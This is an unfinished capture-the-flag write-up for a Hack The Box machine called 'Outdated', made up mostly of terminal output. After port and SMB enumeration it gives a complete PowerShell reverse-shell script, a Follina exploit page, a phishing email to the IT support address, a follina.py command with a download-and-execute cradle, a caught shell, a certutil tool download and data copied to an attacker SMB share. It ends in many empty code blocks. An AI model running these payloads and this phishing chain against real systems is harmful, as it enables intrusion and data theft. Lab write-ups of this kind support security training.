---
title: HTB-Outdated Writeup
date: 2026-08-28T14:00:00+08:00
draft: true
toc: true
images:
tags:
  - Hack
  - SMTP
---
## Nmap 探测

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sudo nmap --min-rate 10000 -p- 10.129.229.239 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 22:13 -0400
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 33.79% done; ETC: 22:14 (0:00:08 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.99% done; ETC: 22:14 (0:00:07 remaining)
Nmap scan report for 10.129.229.239
Host is up (0.071s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
49669/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49969/tcp open  unknown
49986/tcp open  unknown
50035/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,49669,49689,49690,49969,49986,50035
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sudo nmap -sT -sC -sV -O -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,49669,49689,49690,49969,49986,50035 10.129.229.239 -oA
Nmap/detail
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-27 22:16 -0400
Nmap scan report for 10.129.229.239
Host is up (0.082s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-28 10:16:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-28T10:17:39+00:00; +7h59m21s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-08-28T09:32:59
|_Not valid after:  2027-08-28T09:32:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-28T10:17:39+00:00; +7h59m22s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-08-28T09:32:59
|_Not valid after:  2027-08-28T09:32:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-28T10:17:39+00:00; +7h59m21s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-08-28T09:32:59
|_Not valid after:  2027-08-28T09:32:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-08-28T09:32:59
|_Not valid after:  2027-08-28T09:32:59
|_ssl-date: 2026-08-28T10:17:39+00:00; +7h59m22s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  unknown
49669/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49969/tcp open  msrpc         Microsoft Windows RPC
49986/tcp open  msrpc         Microsoft Windows RPC
50035/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m21s, deviation: 0s, median: 7h59m21s
| smb2-time:
|   date: 2026-08-28T10:17:01
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.98 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sudo bash -c 'echo "10.129.229.239 outdated.htb mail.outdated.htb DC.outdated.htb" >> /etc/hosts'
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ tail -n 1 /etc/hosts
10.129.229.239 outdated.htb mail.outdated.htb DC.outdated.htb
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ nxc smb 10.129.229.239 -u 'enil' -p '' --shares
SMB         10.129.229.239  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.239  445    DC               [+] outdated.htb\enil: (Guest)
SMB         10.129.229.239  445    DC               [*] Enumerated shares
SMB         10.129.229.239  445    DC               Share           Permissions     Remark
SMB         10.129.229.239  445    DC               -----           -----------     ------
SMB         10.129.229.239  445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.239  445    DC               C$                              Default share
SMB         10.129.229.239  445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.239  445    DC               NETLOGON                        Logon server share
SMB         10.129.229.239  445    DC               Shares          READ
SMB         10.129.229.239  445    DC               SYSVOL                          Logon server share
SMB         10.129.229.239  445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.129.229.239  445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.129.229.239  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

```bash
┌──(kali㉿kali)-[~/…/Kali/Outdated/SMB/Shares]
└─$ smbclient //10.129.229.239/shares -U -N
Password for [WORKGROUP\-N]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (118.4 KiloBytes/sec) (average 118.4 KiloBytes/sec)
smb: \> ^C
┌──(kali㉿kali)-[~/…/Kali/Outdated/SMB/Shares]
└─$ ls -liah
total 116K
2783039 drwxrwxr-x 2 kali kali 4.0K Aug 27 22:30 .
2783038 drwxrwxr-x 3 kali kali 4.0K Aug 27 22:30 ..
2783040 -rw-r--r-- 1 kali kali 105K Aug 27 22:30 NOC_Reminder.pdf
```

![](Pasted%20image%2020260828103231.png)

```bash
┌──(kali㉿kali)-[~/…/Kali/Outdated/Users/emails]
└─$ cat emails
itsupport@outdated.htb
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ git clone https://github.com/chvancooten/follina.py
Cloning into 'follina.py'...
remote: Enumerating objects: 131, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 131 (delta 11), reused 8 (delta 8), pack-reused 109 (from 1)
Receiving objects: 100% (131/131), 51.61 KiB | 580.00 KiB/s, done.
Resolving deltas: 100% (58/58), done.
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ ls
follina.py  Nmap  SMB  Users
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ cd follina.py
┌──(kali㉿kali)-[~/Work/Kali/Outdated/follina.py]
└─$ ls -liah
total 36K
2783043 drwxrwxr-x 5 kali kali 4.0K Aug 28 01:42 .
2783028 drwxrwxr-x 6 kali kali 4.0K Aug 28 01:42 ..
2793044 -rw-rw-r-- 1 kali kali 7.9K Aug 28 01:42 follina.py
2783045 drwxrwxr-x 7 kali kali 4.0K Aug 28 01:42 .git
2793026 drwxrwxr-x 2 kali kali 4.0K Aug 28 01:42 .github
2793042 -rw-rw-r-- 1 kali kali   64 Aug 28 01:42 .gitignore
2793043 -rw-rw-r-- 1 kali kali 3.3K Aug 28 01:42 README.md
2793045 drwxrwxr-x 4 kali kali 4.0K Aug 28 01:42 src
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ cat shell.ps1
$c=New-Object System.Net.Sockets.TCPClient('10.10.16.151',4444)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
  $r=(iex $d 2>&1 | Out-String)
  $r=$r+'PS '+(pwd).Path+'> '
  $x=([text.encoding]::ASCII).GetBytes($r)
  $s.Write($x,0,$x.Length)
}
$c.Close()
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ cat exploit.html
<!DOCTYPE html>
<html>
	<body>
		<script>
			windows.location.hrep = "ms-mstd:/id PCWDignostic /skip force /param \"IT_RebrowseForFile? IT_LaunchMethod=ContextMenu
  IT_BrowseForFile=/../../$(POWERSHELL_PAYLOAD)$/../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
		</script>
	</body>
</html>
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sendEmail -f "enil@outdated.htb" -t "itsupport@outdated.htb" -u "Test" -m "http://10.10.16.151/exploit" -s 10.129.229.239:25
Aug 28 02:29:11 kali sendEmail[14003]: WARNING => The recipient <itsupport@outdated.htb> was rejected by the mail server, error follows:
Aug 28 02:29:11 kali sendEmail[14003]: WARNING => Received: 	530 SMTP authentication is required.
Aug 28 02:29:11 kali sendEmail[14003]: ERROR => Exiting. No recipients were accepted for delivery by the mail server.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sendEmail -f "enil@enil.htb" -t "itsupport@outdated.htb" -u "Web app" -m "http://10.10.16.151/exploit.html" -s 10.129.229.239:25                                  
Aug 28 02:35:46 kali sendEmail[14329]: Email was sent successfully!
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated/follina.py]
└─$ python3 follina.py -t docx -m command -u 10.10.16.151 -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.151:8000/shell.ps1')"
Generated 'clickme.docx' in current directory
Generated 'exploit.html' in 'www' directory
Serving payload on http://10.10.16.151:80/exploit.html
10.129.229.239 - - [28/Aug/2026 02:44:00] "GET /exploit.html HTTP/1.1" 200 -

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ goshs -p 8000                                  
WARNING[2026-08-28 02:28:37] Failed to check for updates: GET https://api.github.com/repos/patrickhener/goshs/releases/latest: 403 API rate limit exceeded for 13.229.116.106. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.) [rate reset in 1m51s] 
  __ _  ___  ___| |__  ___ 
 / _` |/ _ \/ __| '_ \/ __|
| (_| | (_) \__ \ | | \__ \
 \__, |\___/|___/_| |_|___/
  __/ |                    
 |___/              v2.0.6

INFO   [2026-08-28 02:28:37] Download embedded file at: /example.txt?embedded 
INFO   [2026-08-28 02:28:37] Serving on interface lo bound to 127.0.0.1:8000 
INFO   [2026-08-28 02:28:37] Serving on interface eth0 bound to 10.10.10.5:8000 
INFO   [2026-08-28 02:28:37] Serving on interface br-146170ca17a5 bound to 172.18.0.1:8000 
INFO   [2026-08-28 02:28:37] Serving on interface docker0 bound to 172.17.0.1:8000 
INFO   [2026-08-28 02:28:37] Serving on interface tun0 bound to 10.10.16.151:8000 
INFO   [2026-08-28 02:28:37] Serving HTTP from /home/kali/Work/Kali/Outdated 
INFO   [2026-08-28 02:44:03] 10.129.229.239:49821 - [200] - "GET /shell.ps1 HTTP/1.1"
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sudo rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.229.239] 49822
whoami
outdated\btables
PS C:\Users\btables\AppData\Local\Temp\SDIAG_78590729-e86b-44c0-b069-58a2457cdea1> whoami
outdated\btables

```

```bash
PS C:\Users\btables\AppData\Local\Temp\SDIAG_78590729-e86b-44c0-b069-58a2457cdea1> hostname
client
PS C:\Users\btables\AppData\Local\Temp\SDIAG_78590729-e86b-44c0-b069-58a2457cdea1> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes                                        
========================================== ================ ============================================ ==================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
OUTDATED\ITStaff                           Group            S-1-5-21-4089647348-67660539-4016542185-1107 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ ls -liah SharpHound.exe
2793071 -rw-rw-r-- 1 kali kali 1.3M Aug 28 03:08 SharpHound.exe
```

```bash
PS C:\programdata\apps> certutil -urlcache -f http://10.10.16.151:8000/SharpHound.exe SharpHound.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         8/28/2026   7:16 AM        1351680 SharpHound.exe
```

```bash
PS C:\programdata\apps> .\SharpHound.exe -c All --ZipFilename data.zip 
...
...
PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         8/28/2026   7:18 AM          42209 20260828071713_data.zip
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ sudo impacket-smbserver -smb2support -username enil -password enil share .
[sudo] password for kali: 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```

```bash
PS C:\programdata\apps> net use \\10.10.16.151\share /user:enil enil
The command completed successfully.

PS C:\programdata\apps> copy 20260828071713_data.zip \\10.10.16.151\share\data.zip
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Outdated]
└─$ ls -liah data.zip
2793074 -rwxr-xr-x 1 root root 42K Aug 28  2026 data.zip
```

![](Pasted%20image%2020260828153728.png)

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```